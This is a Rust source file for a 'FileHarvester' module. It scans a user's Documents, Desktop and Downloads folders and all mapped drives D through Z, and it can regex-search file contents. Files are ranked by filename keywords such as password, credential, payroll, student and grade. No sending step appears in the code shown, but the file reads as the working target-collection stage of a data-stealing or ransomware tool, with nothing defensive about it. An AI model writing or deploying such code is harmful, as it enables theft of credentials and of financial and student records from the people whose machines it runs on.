use std::fs;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;
use regex::Regex;

pub struct FileHarvester;

impl FileHarvester {
    pub fn harvest_by_extension(extensions: &[String], max_size: u64) -> Vec<FileTarget> {
        let mut targets = Vec::new();
        
        // Common paths to search
        let search_paths = vec![
            dirs::document_dir(),
            dirs::desktop_dir(),
            dirs::download_dir(),
        ];
        
        for base_path in search_paths {
            if let Some(path) = base_path {
                targets.extend(Self::scan_directory(&path, extensions, max_size));
            }
        }
        
        // Also check network drives
        targets.extend(Self::scan_network_drives(extensions, max_size));
        
        targets
    }
    
    fn scan_directory(base: &Path, extensions: &[String], max_size: u64) -> Vec<FileTarget> {
        let mut files = Vec::new();
        
        for entry in WalkDir::new(base)
            .max_depth(5)
            .into_iter()
            .filter_map(|e| e.ok()) {
            
            if !entry.file_type().is_file() {
                continue;
            }
            
            let path = entry.path();
            
            // Check extension
            if let Some(ext) = path.extension() {
                let ext_str = ext.to_string_lossy().to_lowercase();
                if !extensions.iter().any(|e| e.to_lowercase() == ext_str) {
                    continue;
                }
            } else {
                continue;
            }
            
            // Check size
            if let Ok(metadata) = entry.metadata() {
                if metadata.len() > max_size {
                    continue;
                }
                
                // Check for interesting keywords in filename
                let filename = path.file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .to_lowercase();
                
                let priority = Self::calculate_priority(&filename);
                
                files.push(FileTarget {
                    path: path.to_path_buf(),
                    size: metadata.len(),
                    priority,
                    extension: path.extension()
                        .unwrap_or_default()
                        .to_string_lossy()
                        .to_string(),
                });
            }
        }
        
        // Sort by priority
        files.sort_by(|a, b| b.priority.cmp(&a.priority));
        files
    }
    
    fn scan_network_drives(extensions: &[String], max_size: u64) -> Vec<FileTarget> {
        let mut files = Vec::new();
        
        // Enumerate mapped drives
        for letter in 'D'..='Z' {
            let drive = format!("{}:\\", letter);
            if Path::new(&drive).exists() {
                files.extend(Self::scan_directory(Path::new(&drive), extensions, max_size));
            }
        }
        
        files
    }
    
    fn calculate_priority(filename: &str) -> u8 {
        let keywords = vec![
            ("password", 10),
            ("credential", 10),
            ("secret", 9),
            ("confidential", 9),
            ("financial", 8),
            ("budget", 8),
            ("payroll", 8),
            ("student", 7),
            ("grade", 7),
            ("transcript", 7),
            ("research", 6),
            ("patent", 6),
            ("contract", 6),
        ];
        
        for (keyword, score) in keywords {
            if filename.contains(keyword) {
                return score;
            }
        }
        
        1 // Default priority
    }
    
    pub fn search_by_content(pattern: &str, paths: &[PathBuf]) -> Vec<FileTarget> {
        let regex = match Regex::new(pattern) {
            Ok(r) => r,
            Err(_) => return vec![],
        };
        
        let mut matches = Vec::new();
        
        for path in paths {
            if let Ok(content) = fs::read_to_string(path) {
                if regex.is_match(&content) {
                    if let Ok(metadata) = fs::metadata(path) {
                        matches.push(FileTarget {
                            path: path.clone(),
                            size: metadata.len(),
                            priority: 10,
                            extension: path.extension()
                                .unwrap_or_default()
                                .to_string_lossy()
                                .to_string(),
                        });
                    }
                }
            }
        }
        
        matches
    }
}

#[derive(Debug, Clone)]
pub struct FileTarget {
    pub path: PathBuf,
    pub size: u64,
    pub priority: u8,
    pub extension: String,
}